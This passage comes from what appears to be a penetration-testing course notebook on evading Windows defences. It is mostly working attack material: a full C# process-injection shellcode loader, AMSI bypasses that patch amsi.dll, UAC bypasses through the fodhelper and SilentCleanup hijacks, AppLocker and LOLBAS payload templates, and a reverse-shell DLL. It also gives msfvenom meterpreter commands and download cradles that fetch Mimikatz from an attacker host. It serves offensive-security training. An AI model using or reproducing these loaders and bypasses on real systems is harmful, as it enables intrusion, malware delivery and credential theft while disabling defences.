  • AES-encrypt the shellcode via CyberChef and embed into the AES-loader (reuse NotMalware template), recompile x64 Release.
  • Start listener, execute payload, verify shell is obtained without Defender killing the process: 
    nc -lvnp 8080
  • Alternatively, compile RShell.exe (custom tool), no encryption needed: 
    .\RShell.exe <LHOST> <LPORT>

13.4 Process Injection (PE Injection)

Process injection runs malicious code inside another process's address space. Portable Executable Injection copies shellcode into a target process and executes it via CreateRemoteThread.

TechniqueMethod
DLL InjectionWrite DLL path into target process; call LoadLibrary
PE InjectionCopy shellcode into target; execute with CreateRemoteThread
Process HollowingSpawn process suspended; replace entrypoint; resume
Thread Execution HijackingSuspend thread; overwrite code; resume thread

13.4.1 WinAPI Function Parameters

// Allocate memory in target process
lpBaseAddress = VirtualAllocEx(
    hProcess,         // Handle to target process
    lpAddress,        // Desired base address, or NULL
    dwSize,           // Size in bytes
    flAllocationType, // MEM_COMMIT | MEM_RESERVE = 0x3000
    flProtect         // PAGE_READWRITE = 0x04
);

// Write shellcode into allocated space
WriteProcessMemory(
    hProcess,              // Handle to target process
    lpBaseAddress,         // Destination (from VirtualAllocEx)
    lpBuffer,              // Pointer to shellcode
    nSize,                 // Shellcode size
    out lpNumberOfBytesWritten
);

// Execute shellcode in target process
CreateRemoteThread(
    hProcess,           // Handle to target process
    lpThreadAttributes, // NULL
    dwStackSize,        // 0 (default)
    lpStartAddress,     // Entry point (from VirtualAllocEx)
    lpParameter,        // NULL
    dwCreationFlags,    // 0
    lpThreadId          // NULL if thread ID not needed
);

13.4.2 AlsoNotMalware - Full PE Injection Implementation

using System;
using System.Runtime.InteropServices;

namespace AlsoNotMalware
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb; IntPtr lpReserved; IntPtr lpDesktop; IntPtr lpTitle;
            uint dwX; uint dwY; uint dwXSize; uint dwYSize;
            uint dwXCountChars; uint dwYCountChars; uint dwFillAttributes;
            uint dwFlags; ushort wShowWindow; ushort cbReserved;
            IntPtr lpReserved2; IntPtr hStdInput; IntPtr hStdOutput; IntPtr hStdErr;
        }

        public const uint PageReadWrite   = 0x04;
        public const uint PageReadExecute = 0x20;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow  = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine,
            IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles,
            uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir,
            [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // micr0_shell shellcode (plain, not encrypted - injected into target process)
            byte[] buf = { /* <SNIP> */ };

            // 1. Spawn target process (notepad) detached, no window
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            uint flags = DetachedProcess | CreateNoWindow;
            CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe",
                IntPtr.Zero, IntPtr.Zero, false, flags,
                IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo);

            // 2. Allocate RW memory in target process
            IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero,
                (uint)buf.Length, 0x3000, PageReadWrite);

            // 3. Write shellcode into target process
            IntPtr outSize;
            WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);

            // 4. Change memory protection to RX (avoids RWX alloc suspicion)
            uint lpflOldProtect;
            VirtualProtectEx(procInfo.hProcess, lpBaseAddress,
                (uint)buf.Length, PageReadExecute, out lpflOldProtect);

            // 5. Execute shellcode in target process
            IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero,
                0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

Methodology

  • Generate shellcode (micr0_shell, plain - no encryption needed for injected payload): 
    python.exe .\micr0_shell.py -i <LHOST> -p <LPORT> -l csharp
  • Embed shellcode into AlsoNotMalware, compile x64 Release. Note: use PageReadWrite → write → PageReadExecute to avoid RWX suspicion.
  • Start listener, execute AlsoNotMalware.exe, verify reverse shell lands in the notepad.exe process context.

13.5 AMSI Bypass

The Antimalware Scan Interface (AMSI) is a Windows interface that applications (notably PowerShell) use to scan input for malicious content before execution. PowerShell calls AmsiScanBuffer / AmsiScanString on every command. Bypassing AMSI means preventing those calls from returning a detection result.

Note: AMSI is integrated into PowerShell, WScript/CScript, JavaScript, VBScript, and Office VBA macros. It is only active for code loaded from memory at CLR runtime - on-disk scanning is handled by Defender separately.

13.5.1 String Manipulation

Many AMSI bypass strings are themselves detected. Split or concatenate them to evade signature matching.

# "amsiUtils" triggers detection - split to evade
"amsi" + "Utils"

# Or use Base64 encoding to obscure the string entirely

13.5.2 Bypass 1: Setting amsiInitFailed

The ScanContent method in System.Management.Automation.AmsiUtils returns AMSI_RESULT_NOT_DETECTED immediately if amsiInitFailed is true. Setting this field via reflection disables AMSI for the current PowerShell session.

# Original (now detected directly - bypass with string concatenation)
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
Note: This bypass only disables AMSI for the PowerShell session itself. It does NOT disable AMSI for .NET assemblies loaded via [System.Reflection.Assembly]::Load() - use Bypass 2 for that.

13.5.3 Bypass 2: Patching AmsiScanBuffer

Patch AmsiScanBuffer in amsi.dll to always return an error code (E_FAIL = 0x80004005). When AmsiScanBuffer returns an error, ScanContent sets amsi_RESULT to AMSI_RESULT_NOT_DETECTED. This bypass affects the DLL itself, so it also covers [System.Reflection.Assembly]::Load() calls.

# Shellcode: mov eax, 0x80004005; ret  (forces E_FAIL return)
# Assemble with online x86/x64 assembler to get: B8 05 40 00 80 C3

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
"@;
[Byte[]] $patch = (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
$hModule   = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;

13.5.4 Bypass 3: Forcing an Error in AmsiOpenSession

AmsiOpenSession in amsi.dll returns 0x80070057 ("invalid arguments") if the first four bytes of amsiContext are not the ASCII string "AMSI". This triggers amsiInitFailed = true in AmsiUtils.Init, which permanently disables AMSI for the session.

$utils   = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context', 'NonPublic,Static');
$session = $utils.GetField('amsi'+'Session', 'NonPublic,Static');
$marshal = [System.Runtime.InteropServices.Marshal];

# Allocate 4-byte buffer (invalid context - first 4 bytes won't be "AMSI")
$newContext = $marshal::AllocHGlobal(4);
$context.SetValue($null, [IntPtr]$newContext);
# Set session to null to ensure the failing branch is taken
$session.SetValue($null, $null);
Note: Bypass 3 also only covers the PowerShell session (not Assembly::Load). For reflective loading of .NET assemblies, use Bypass 2 which patches amsi.dll directly.

13.5.5 Automated AMSI Bypass Tools

ToolURLMethod
amsi.failhttps://amsi.fail/Generates obfuscated bypass snippets from multiple known techniques; each request produces unique output
AMSITriggerhttps://github.com/RythmStick/AMSITriggerScans a PS1/script to identify which strings trigger AMSI signatures
 
# Find AMSI-flagged strings in a script (-f 3 shows triggers, -f 2 adds line numbers)
AmsiTrigger_x64.exe -i "malicious-script.ps1" -f 3

# Check for amsiUtils references (detection)
Get-Command -Module amsiutils

Methodology

  • Check current PowerShell language mode and AMSI status: 
    $ExecutionContext.SessionState.LanguageMode
  • Run AMSITrigger to identify flagged strings in a script before running it: 
    AmsiTrigger_x64.exe -i ".\Invoke-Mimikatz.ps1" -f 3
  • Apply AMSI Bypass 2 (patches amsi.dll - works for both PS session and Assembly::Load) via download cradle: 
    IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/amsi_bypass2.ps1')
  • Verify bypass is active, then load tool: 
    # Should not be blocked after bypass
"amsiUtils"
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')

13.6 Open-Source Software Evasion

Antivirus solutions maintain signatures for popular tools like Rubeus, Mimikatz, and Seatbelt. Two techniques help: manually breaking signatures, and reflective in-memory loading.

13.6.1 Option 1: Manually Breaking Signatures

The process is iterative: compile, scan with ThreatCheck, modify the detected string/GUID, repeat.

# Iterative process:
# 1. Compile the tool (e.g., Rubeus)
# 2. Scan with ThreatCheck
C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f .\Rubeus.exe

# 3a. Replace detected strings (e.g., "ticket" -> "tekcit") in Visual Studio:
#     Ctrl+Shift+H -> Replace in Files

# 3b. Rename flagged classes (e.g., DiffieHellmanKey -> DHKey) via right-click -> Rename

# 3c. Generate a new GUID to replace the TypeLib GUID (detected by YARA rules)
[GUID]::NewGUID()

# Update in Visual Studio: Project -> Properties -> Application -> Assembly Information -> GUID
# 4. Rebuild and re-scan. Repeat until "No threat found!"
Note: TypeLib GUIDs are unique per project and are a common YARA detection vector. Always regenerate the GUID when obfuscating .NET tools. The FireEye Rubeus YARA rule checks only for the MZ header and the TypeLib GUID - changing the GUID defeats it.

13.6.2 Option 2: Reflective Assembly Loading (Seatbelt Example)

Load a C# assembly entirely in-memory from PowerShell using [System.Reflection.Assembly]::Load(). Combined with an AMSI bypass (must use Bypass 2 - patches amsi.dll), this avoids writing any files to disk.

// In Seatbelt Program.cs - change Main from private to public so PS can call it
public static void Main(string[] args) { ... }

Compress and Base64-encode the compiled assembly with CyberChef (GZIP then Base64). Then build the PowerShell wrapper:

function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [String]
        $args = " "
    )
    # Seatbelt.exe -> Gzip -> Base64
    $gzipB64 = "<SNIP>";

    # Base64 decode
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    # Gzip decompress
    $gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream,
        [IO.Compression.CompressionMode]::Decompress);
    $seatbeltMemoryStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($seatbeltMemoryStream);

    # Load assembly reflectively
    $seatbeltArray = $seatbeltMemoryStream.ToArray();
    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);

    # Redirect STDOUT to console
    $OldConsoleOut = [Console]::Out;
    $StringWriter = New-Object IO.StringWriter;
    [Console]::SetOut($StringWriter);

    # Invoke Main method
    [Seatbelt.Program]::Main($args.Split(" "));

    # Reset STDOUT
    [Console]::SetOut($OldConsoleOut);
    $Results = $StringWriter.ToString();
    $Results;
}
# Load AMSI Bypass 2 FIRST (patches amsi.dll - required for Assembly::Load to work)
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/amsi_bypass2.ps1')

# Then load and invoke Seatbelt
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -args "TokenPrivileges"
Note: AMSI Bypass 1 (setting amsiInitFailed) only disables AMSI for the PowerShell script engine. It does NOT cover [System.Reflection.Assembly]::Load(). You must use Bypass 2 (patching amsi.dll) when reflectively loading .NET assemblies.

Methodology

  • Compile the target tool in Release mode, scan with ThreatCheck: 
    ThreatCheck.exe -f .\Rubeus.exe
  • Iteratively rename flagged strings, classes, GUIDs; regenerate TypeLib GUID: 
    [GUID]::NewGUID()
  • For reflective loading: compile with public static void Main, GZIP+Base64 encode, build PS wrapper, load via Bypass 2 + IEX.

13.7 User Account Control (UAC) Bypass

Every Windows process runs at an integrity level: Low, Medium, High, or System. Administrators receive both a standard (Medium) and an elevated (High) access token but operate at Medium by default. UAC manages token elevation. Bypassing UAC means moving from Medium to High integrity without triggering a UAC prompt - needed when you have an admin shell but no GUI access.

Integrity LevelDescription
LowInternet-facing interactions
MediumDefault for all logged-in users
HighElevated (administrator) access
SystemHighest - OS-level processes

13.7.1 Bypass 1: DiskCleanup Scheduled Task Hijack

The SilentCleanup scheduled task can be started by Medium integrity processes but runs at High integrity (it has "Run with highest privileges" enabled). It launches %windir%\system32\cleanmgr.exe. By overriding %windir% in the current user's environment, we control what binary SilentCleanup launches.

# Place RShell.exe in C:\Windows\Tasks\ first
# Set %windir% so SilentCleanup runs our shell instead
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force

# Trigger SilentCleanup (launches at High integrity)
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"

# Cleanup: remove the hijacked windir value
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
Note: The trailing REM with a space acts as a Windows comment, discarding the rest of the original command line (\system32\cleanmgr.exe /autocleanstoragesense ...).

13.7.2 Bypass 2: FodHelper Execution Hijack

C:\Windows\System32\fodhelper.exe has AutoElevate=true in its manifest, so it runs at High integrity when started from a Medium process. It reads HKCU\Software\Classes\ms-settings\Shell\Open\Command to determine how to open the ms-settings protocol. We write our payload to that registry key.

# Verify AutoElevate attribute
C:\Tools\SysinternalsSuite\sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr autoElevate

# Traditional bypass (DETECTED by Defender when ".exe" is in the value):
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
C:\Windows\System32\fodhelper.exe
# Evasion: omit ".exe" extension - Windows resolves it automatically
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force
C:\Windows\System32\fodhelper.exe

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
Note: Defender detects ".exe" in the registry value being set. Dropping the extension bypasses this detection - Windows resolves executables without extensions automatically.

Methodology

  • Confirm current integrity level (should be Medium before bypass): 
    whoami /groups | findstr "Mandatory"
  • Place reverse shell binary in C:\Windows\Tasks\: 
    Copy-Item .\RShell.exe C:\Windows\Tasks\
  • Start listener, then run DiskCleanup bypass: 
    Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell <IP> <PORT> & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
  • Or run FodHelper bypass (no .exe extension): 
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> <PORT>" -Force
C:\Windows\System32\fodhelper.exe
  • Verify elevated shell (should show High integrity), then clean up registry keys: 
    whoami /groups | findstr "Mandatory"
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force

13.8 AppLocker Bypass

AppLocker restricts which executables, scripts, MSI files, packaged apps, and DLLs a user can run. Rules can be local or domain-wide. The default ruleset for both executables and scripts allows %WINDIR%\* and %PROGRAMFILES%\* for Everyone - but standard users can write to some subdirectories under %WINDIR%.

File TypeExtensions
Executable files.exe, .com
Windows Installer.msi, .msp
Scripts.js, .ps1, .vbs, .cmd, .bat
Packaged apps.appx
DLLs.dll (not enforced by default)

13.8.1 Enumerating AppLocker Policy

# Get effective AppLocker policy as XML
Get-AppLockerPolicy -Effective -Xml

# Test whether a specific file would be allowed for a given user
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\SysinternalsSuite\procexp.exe -User max

# Find writable+executable directories under %WINDIR% (bypasses default ruleset)
Get-ChildItem $env:windir -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $dir = $_;
    (Get-Acl $dir.FullName).Access | ForEach-Object {
        if ($_.AccessControlType -eq "Allow") {
            if ($_.IdentityReference.Value -eq "NT AUTHORITY\Authenticated Users" -or
                $_.IdentityReference.Value -eq "BUILTIN\Users") {
                if (($_.FileSystemRights -like "*Write*" -or $_.FileSystemRights -like "*Create*") -and
                    $_.FileSystemRights -like "*Execute*") {
                    Write-Host ($dir.FullName + ": " + $_.IdentityReference.Value + " (" + $_.FileSystemRights + ")")
                }
            }
        }
    };
}

Common writable + executable directories found by default:

C:\Windows\Tasks: NT AUTHORITY\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)
C:\Windows\Temp: BUILTIN\Users (CreateFiles, AppendData, ExecuteFile, Synchronize)
C:\Windows\tracing: BUILTIN\Users (Write, ReadAndExecute, Synchronize)
C:\Windows\System32\spool\drivers\color: BUILTIN\Users (CreateFiles, ReadAndExecute, Synchronize)

Copy any payload to C:\Windows\Tasks\ to bypass the default AppLocker executable and script rulesets.

Methodology

  • Enumerate effective AppLocker policy and find writable directories: 
    Get-AppLockerPolicy -Effective -Xml
# Run AppLockerBypassChecker script
C:\Tools\AppLockerBypassChecker.ps1
  • Copy payload to writable-executable directory and execute: 
    Copy-Item .\payload.exe C:\Windows\Tasks\
C:\Windows\Tasks\payload.exe

13.9 LOLBAS: InstallUtil

Living off the Land (LOTL) abuses Microsoft-signed binaries already present in the OS. The LOLBAS project (lolbas-project.github.io) catalogs these binaries and their abuse methods. Since they reside in %WINDIR%, they pass AppLocker's default ruleset.

InstallUtil.exe installs/uninstalls server resources. It executes the Uninstall() override of any class extending System.Configuration.Install.Installer when called with the /U flag.

BitnessPath
32-bitC:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
64-bitC:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
 
# Verify InstallUtil is allowed by AppLocker default rules
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe

13.9.1 NotMalware_IU - InstallUtil Payload Template

Reference System.Configuration.Install.dll manually (Project > Add Reference > Browse > C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll).

using System;
using System.Configuration.Install;

public class NotMalware_IU
{
    public static void Main(string[] args)
    {
        // Empty Main - InstallUtil does not call this
    }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size,
        UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        UInt32 flNewProtect, out UInt32 lpflOldProtect);
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize,
        IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // AES-encrypted micr0_shell shellcode
        string bufEnc = "<SNIP>";
        // Decrypt + VirtualAlloc + Marshal.Copy + VirtualProtect + CreateThread
        // <SNIP>
    }
}
# Execute payload via InstallUtil (use 64-bit for 64-bit shellcode)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Tools\NotMalware_IU\NotMalware_IU\bin\x64\Release\NotMalware_IU.exe

# Or for generic CLM bypass reference (from user notes):
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\malicious.exe

Methodology

  • Create Visual Studio Console App (.NET Framework) project, add reference to System.Configuration.Install.dll.
  • Implement shellcode decryption + execution inside the Uninstall() override. Compile x64 Release.
  • Start listener, trigger via InstallUtil: 
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U .\NotMalware_IU.exe

13.10 LOLBAS: RunDll32

RunDll32 loads and executes DLL functions. Since it resides in %WINDIR%, it passes AppLocker's default ruleset. Exporting methods from a .NET DLL requires the DllExport NuGet package (available via the HTB package source in Visual Studio).

BitnessPath
32-bitC:\Windows\SysWOW64\rundll32.exe
64-bitC:\Windows\System32\rundll32.exe
 
# Verify RunDll32 is allowed by AppLocker
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\rundll32.exe

13.10.1 RShell_D - RunDll32 Payload Template

Create a Class Library (.NET Framework) project. Install DllExport NuGet package. Mark the exported method with [DllExport("DllMain")]. Hardcode IP/Port; use 32-bit PowerShell path; remove string[] args from the method signature.

namespace RShell_D
{
    internal class Program
    {
        [DllExport("DllMain")]
        public static void DllMain()
        {
            try
            {
                TcpClient client = new TcpClient();
                client.Connect("[target-ip]", 1010);
                // ... stream setup ...
                Process p = new Process();
                // Use 32-bit PowerShell to match DLL bitness
                p.StartInfo.FileName = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
                // ... same as RShell but hardcoded, no args ...
            }
            catch (Exception) { }
        }
    }
}
# Execute DllMain via RunDll32
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain

Methodology

  • Create Class Library project, install DllExport NuGet package from HTB package source, mark exported method with [DllExport("DllMain")].
  • Hardcode attacker IP/Port, use 32-bit PowerShell path, compile Release x86 (or x64 for 64-bit PS).
  • Start listener, execute via RunDll32: 
    C:\Windows\System32\RunDll32.exe .\RShell_D.dll,DllMain

13.11 PowerShell ConstrainedLanguage Mode Bypass

When AppLocker is configured, PowerShell automatically switches non-elevated sessions to ConstrainedLanguage mode. High-integrity PowerShell sessions remain in FullLanguage mode.

Language ModeDescription
FullLanguageNo restrictions (default)
RestrictedLanguageCommands allowed; script blocks disallowed
ConstrainedLanguageMalicious-potential operations restricted; Add-Type blocked; only whitelisted types
NoLanguagePowerShell scripting fully disabled
 
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

13.11.1 Bypass 1: Custom Runspace (CLMBypass)

A PowerShell Runspace is the operating environment for commands. Runspaces created programmatically default to FullLanguage mode regardless of AppLocker policy. Write a C# program that creates a custom runspace, executes a PowerShell command passed as an argument, and prints results.

// Add reference to:
// C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\
//   v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

static void Main(string[] args)
{
    if (args.Length == 0) return;

    // Create and open a FullLanguage runspace
    Runspace runspace = RunspaceFactory.CreateRunspace();
    runspace.Open();

    // Create PowerShell object bound to our runspace
    PowerShell ps = PowerShell.Create();
    ps.Runspace = runspace;

    // Execute the provided command
    ps.AddScript(String.Join(" ", args));
    Collection<PSObject> results = ps.Invoke();
    foreach (PSObject obj in results)
    {
        Console.WriteLine(obj.ToString());
    }

    runspace.Close();
}
# Copy CLMBypass.exe to a writable-executable AppLocker-allowed path
Copy-Item .\CLMBypass.exe C:\Windows\Tasks\

# Execute PowerShell commands in FullLanguage mode through CLMBypass
C:\Windows\Tasks\CLMBypass.exe "<powershell command here>"

# Example: run AMSI bypass or load a script
C:\Windows\Tasks\CLMBypass.exe "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1')"

13.11.2 Bypass 2: Downgrade to PowerShell 2.0

PowerShell 2.0 (released 2009) predates both ConstrainedLanguage Mode and AMSI. If installed on the target, downgrading bypasses both.

# Downgrade to PowerShell 2.0 (bypasses CLM and AMSI)
powershell -version 2

# Extended form for running a command directly
powershell.exe -Version 2.0 -Command {<scriptblock>} -ExecutionPolicy Bypass

# Run Mimikatz in-memory via PS 2.0 (no AMSI)
powershell.exe -Version 2.0 -Command "Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz" -Command '"privilege::debug"'
Note: PowerShell 2.0 was deprecated in 2017 and is increasingly rare on modern systems. Verify it is installed before relying on this technique: powershell -version 2 -Command "write 'PS 2.0 available'".

Methodology

  • Check language mode: 
    $ExecutionContext.SessionState.LanguageMode
  • Check if PowerShell 2.0 is available (quick win): 
    powershell -version 2 -Command "write 'available'"
  • Build CLMBypass (C# runspace program), compile x64 Release, copy to C:\Windows\Tasks\: 
    Copy-Item .\CLMBypass.exe C:\Windows\Tasks\
  • Execute arbitrary PowerShell through CLMBypass (bypasses ConstrainedLanguage): 
    C:\Windows\Tasks\CLMBypass.exe "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')"

13.12 Evasion with Additional Techniques (User Notes)

The following techniques supplement the module material from personal notes.

13.12.1 Signature-Based Scanning: Find-AVSignature

# Split binary into sections to find which triggers AV
Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mal.exe -OutPath mal_1 -Verbose -Force

# Scan each section with ClamAV
.\clamscan.exe mal_1

# Replace flagged bytes with nulls (set last byte to 0xFF as marker)
$bytes = [System.IO.File]::ReadAllBytes("mal.exe")
$bytes[1111] = 0
[System.IO.File]::WriteAllBytes("mal_mod.exe", $bytes)

13.12.2 Metasploit Encoders and Encryptors

# Encode payload (shikata_ga_nai for 32-bit)
msfvenom -p [password]/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o met_shikata.exe

# Encode payload (zutto_dekiru for 64-bit)
msfvenom -p [password]/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x64/zutto_dekiru -f exe -o met_zekiro.exe

# Encrypt with AES-256
msfvenom -p [password]/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> --encrypt aes256 --encrypt-key <RANDOM_KEY> -f exe -o mal_aes.exe
Note: Metasploit encoders are now primarily useful for removing bad characters in shellcode rather than evading modern AV. Static decryption patterns in msfvenom-encrypted payloads are still detectable by heuristic scans.

13.12.3 Sleep Timer Evasion (C#)

Sleeping before executing payload causes sandbox environments (which have a time limit) to skip the malicious code. Check that the sleep actually completed - sandboxes may accelerate time.

[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);

static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(5000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if (t2 < 5)
    {
        // Sandbox detected - exit without executing payload
        return;
    }
    // Proceed with payload execution
}

13.12.4 Mimikatz Evasion Techniques

TechniqueDescription
String replacementReplace all instances of "Mimikatz" with arbitrary text (e.g., please_subscribe)
Metadata modificationChange company name, copyright, icon, build info
Ordinal-based API loadingLoad functions by ordinal instead of name to avoid string signatures
GUID replacementRegenerate TypeLib GUID to defeat YARA rules
 
// Ordinal-based API loading to avoid string "I_NetServerPasswordGet"
LoadLibrary("netapi32.dll");
GetProcAddress(hModule, MAKEINTRESOURCE(62)); // Instead of "I_NetServerPasswordGet"

13.12.5 Advanced VBA Techniques

TechniqueEffect
VBA StompingRemoves visible VBA source code; P-code runs without AV seeing script content
WMI process executionBreaks parent-child process chain (Word → cmd), evading process-tree heuristics
String obfuscationReverses strings (StrReverse) to defeat static string matching
 
' Execute PowerShell via WMI to break parent-child process chain
Sub MyMacro
